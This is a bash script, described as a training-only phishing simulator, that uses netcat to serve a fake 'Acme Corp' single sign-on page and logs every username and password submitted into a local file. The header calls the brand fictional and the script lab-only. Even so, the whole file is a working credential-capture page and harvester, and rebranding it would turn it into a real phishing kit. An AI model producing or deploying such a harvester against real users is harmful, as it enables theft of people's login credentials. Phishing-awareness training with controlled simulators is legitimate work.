#!/usr/bin/env bash
# sim_phish.sh — TRAINING-ONLY credential capture demo (fictional brand).
# Run on Kali:      bash sim_phish.sh 8080
# Visit:            http://localhost:8080  (or http://<kali-ip>:8080)
# Submitted creds:  appended to captured.log
# This impersonates NO real company. Use only in labs/training you control.

PORT="${1:-8080}"
LOGFILE="captured.log"

PAGE='<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Acme Corp - Single Sign-On</title>
<style>
  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
       background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);font-family:Segoe UI,Arial,sans-serif}
  .card{background:#fff;border-radius:12px;padding:2.5rem 2rem;width:340px;
        box-shadow:0 10px 40px rgba(0,0,0,.35)}
  .logo{width:56px;height:56px;border-radius:50%;background:#e91e63;color:#fff;
        display:flex;align-items:center;justify-content:center;font-weight:700;font-size:22px;margin:0 auto 12px}
  h2{text-align:center;color:#1a1a2e;margin:0 0 4px;font-size:20px}
  p{text-align:center;color:#777;font-size:13px;margin:0 0 20px}
  input{width:100%;padding:11px 12px;margin:6px 0 14px;border:1px solid #d0d7de;border-radius:6px;
        box-sizing:border-box;font-size:14px}
  input:focus{outline:none;border-color:#e91e63;box-shadow:0 0 0 3px rgba(233,30,99,.12)}
  button{width:100%;padding:11px;background:#e91e63;color:#fff;border:none;border-radius:6px;
         font-size:15px;font-weight:600;cursor:pointer}
  button:hover{background:#d81b60}
</style>
</head>
<body>
  <div class="card">
    <div class="logo">AC</div>
    <h2>Acme Corp SSO</h2>
    <p>Sign in with your corporate account</p>
    <form method="POST" action="/">
      <label>Username</label>
      <input type="text" name="username" autocomplete="username" required>
      <label>Password</label>
      <input type="password" name="password" autocomplete="current-password" required>
      <button type="submit">Sign in</button>
    </form>
  </div>
</body>
</html>'

serve() {
  # One-shot HTTP exchange: pipe the response into nc, capture the client's
  # request on stdout. Works with netcat-traditional (default on Kali).
  local req method body
  req=$( { printf 'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: %s\r\nConnection: close\r\n\r\n%s' "${#PAGE}" "$PAGE"; } \
         | nc -l -p "$PORT" -q 1 )
  [ -z "$req" ] && return

  method=$(printf '%s' "$req" | head -n1 | awk '{print $1}')
  if [ "$method" = "POST" ]; then
    # Simple forms send the body as one final line: username=x&password=y
    body=$(printf '%s' "$req" | tail -n1)
    printf '%s | %s\n' "$(date -Is)" "$body" >> "$LOGFILE"
    printf '[+] Captured POST: %s\n' "$body"
  fi
}

echo "[*] Training simulator on http://localhost:$PORT (fictional brand, no real site impersonated)"
echo "[*] Submissions logged to: $LOGFILE   — Ctrl+C to stop"
while true; do serve; done
